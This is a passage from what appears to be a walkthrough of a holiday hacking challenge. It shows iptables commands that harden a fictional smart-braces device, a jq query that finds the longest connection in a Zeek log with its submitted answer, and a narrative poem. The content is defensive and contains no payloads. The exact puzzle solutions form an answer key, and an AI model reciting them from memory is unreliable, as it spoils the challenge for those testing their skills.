# ElfU Research Labs - Smart Braces
### A Lightweight Linux Device for Teeth Braces
### Imagined and Created by ElfU Student Kent TinselTooth

This device is embedded into one's teeth braces for easy management and monitoring of dental status. It uses FTP and HTTP for management and monitoring purposes but also has SSH for remote access. Please refer to the management documentation for this purpose.

## Proper Firewall configuration:

The firewall used for this system is `iptables`. The following is an example of how to set a default policy with using `iptables`:
```
sudo iptables -P FORWARD DROP
```

The following is an example of allowing traffic from a specific IP and to a specific port:

```
sudo iptables -A INPUT -p tcp --dport 25 -s 172.18.5.4 -j ACCEPT
```

A proper configuration for the Smart Braces should be exactly:

1. Set the default policies to DROP for the INPUT, FORWARD, and OUTPUT chains.
2. Create a rule to ACCEPT all connections that are ESTABLISHED,RELATED on the INPUT and the OUTPUT chains.
3. Create a rule to ACCEPT only remote source IP address 172.19.0.225 to access the local SSH server (on port 22).
4. Create a rule to ACCEPT any source IP to the local TCP services on ports 21 and 80.
5. Create a rule to ACCEPT all OUTPUT traffic with a destination TCP port of 80.
6. Create a rule applied to the INPUT chain to ACCEPT all traffic from the lo interface.
elfuuser@229183ee68fa:~$ sudo iptables -P INPUT DROP
elfuuser@229183ee68fa:~$ sudo iptables -P FORWARD DROP
elfuuser@229183ee68fa:~$ sudo iptables -P OUTPUT DROP
elfuuser@229183ee68fa:~$ sudo iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
elfuuser@229183ee68fa:~$ sudo iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
elfuuser@229183ee68fa:~$ sudo iptables -A INPUT -p tcp --dport 22 -s 172.19.0.225 -j ACCEPT
elfuuser@229183ee68fa:~$ sudo iptables -A INPUT -p tcp --dport 21 -j ACCEPT
elfuuser@229183ee68fa:~$ sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT
elfuuser@229183ee68fa:~$ sudo iptables -A OUTPUT -p tcp --dport 80 -j ACCEPT
elfuuser@229183ee68fa:~$ sudo iptables -A INPUT -i lo -j ACCEPT
elfuuser@229183ee68fa:~$ Kent TinselTooth: Great, you hardened my IOT Smart Braces firewall!


/usr/bin/inits: line 10:    22 Killed                  su elfuuser
2.11.3. Afterwords
Speaking again with Kent Tinseltooth:
Oh thank you! It's so nice to be back in my own head again. Er, alone. By the way, have you tried to get into the crate in the Student Union? It has an interesting set of locks. There are funny rhymes, references to perspective, and odd mentions of eggs! And if you think the stuff in your browser looks strange, you should see the page source… Special tools? No, I don't think you'll need any extra tooling for those locks. BUT - I'm pretty sure you'll need to use Chrome's developer tools for that one. Or sorry, you're a Firefox fan? Yeah, Safari's fine too - I just have an ineffible hunger for a physical Esc key. Edge? That's cool. Hm? No no, I was thinking of an unrelated thing.
2.12. Zeek JSON Analysis
2.12.1. Description
I think for some reason my whole first chat with Wunorse Openslae is missing...or never existed at all :)

Zeek JSON Analysis motd:
	Some JSON files can get quite busy.
There's lots to see and do.
Does C&C lurk in our data?
JQ's the tool for you!

-Wunorse Openslae

Identify the destination IP address with the longest connection duration
using the supplied Zeek logfile. Run runtoanswer to submit your answer.

	elf@4278cf5385ef:~$
2.12.2. Solution
elf@94ea6afb5047:~$ jq -s ". |= sort_by(.duration) | .[-1]" conn.log 
{
  "ts": "2019-04-18T21:27:45.402479Z",
  "uid": "CmYAZn10sInxVD5WWd",
  "id.orig_h": "192.168.52.132",
  "id.orig_p": 8,
  "id.resp_h": "13.107.21.200",
  "id.resp_p": 0,
  "proto": "icmp",
  "duration": 1019365.337758,
  "orig_bytes": 30781920,
  "resp_bytes": 30382240,
  "conn_state": "OTH",
  "missed_bytes": 0,
  "orig_pkts": 961935,
  "orig_ip_bytes": 57716100,
  "resp_pkts": 949445,
  "resp_ip_bytes": 56966700
}
elf@94ea6afb5047:~$ runtoanswer 
Loading, please wait......



What is the destination IP address with the longes connection duration? 13.107.21.200



Thank you for your analysis, you are spot-on.
I would have been working on that until the early dawn.
Now that you know the features of jq,
You'll be able to answer other challenges too.

-Wunorse Openslae

Congratulations!
2.12.3. Afterwords
Speaking again with Wunorse Openslae:
That's got to be the one - thanks! Hey, you know what? We've got a crisis here. You see, Santa's flight route is planned by a complex set of machine learning algorithms which use available weather data. All the weather stations are reporting severe weather to Santa's Sleigh. I think someone might be forging intentionally false weather data! I'm so flummoxed I can't even remember how to login! Hmm... Maybe the Zeek http.log could help us. I worry about LFI, XSS, and SQLi in the Zeek log - oh my! And I'd be shocked if there weren't some shell stuff in there too. I'll bet if you pick through, you can find some naughty data from naughty hosts and block it in the firewall. If you find a log entry that definitely looks bad, try pivoting off other unusual attributes in that entry to find more bad IPs. The sleigh's machine learning device (SRF) needs most of the malicious IPs blocked in order to calculate a good route. Try not to block many legitimate weather station IPs as that could also cause route calculation failure. Remember, when looking at JSON data, jq is the tool for you!
3. Narrative


Whose grounds these are, I think I know
His home is in the North Pole though
He will not mind me traipsing here
To watch his students learn and grow
Some other folk might stop and sneer
"Two turtle doves, this man did rear?"
I'll find the birds, come push or shove
Objectives given: I'll soon clear
Upon discov'ring each white dove,
The subject of much campus love,
I find the challenges are more
Than one can count on woolen glove.
Who wandered thus through closet door?
Ho ho, what's this? What strange boudoir!
Things here cannot be what they seem
That portal's more than clothing store.
Who enters contests by the ream
And lives in tunnels meant for steam?
This Krampus bloke seems rather strange
And yet I must now join his team...
Despite this fellow's funk and mange
My fate, I think, he's bound to change.
What is this contest all about?
His victory I shall arrange!
To arms, my friends! Do scream and shout!
Some villain targets Santa's route!
What scum - what filth would seek to end
Kris Kringle's journey while he's out?
Surprised, I am, but "shock" may tend
To overstate and condescend.
'Tis little more than plot reveal
That fairies often do extend
And yet, despite her jealous zeal,
My skills did win, my hacking heal!
No dental dealer can so keep
Our red-clad hero in ordeal!
This Christmas must now fall asleep,
But next year comes, and troubles creep.
And Jack Frost hasn't made a peep,
And Jack Frost hasn't made a peep...
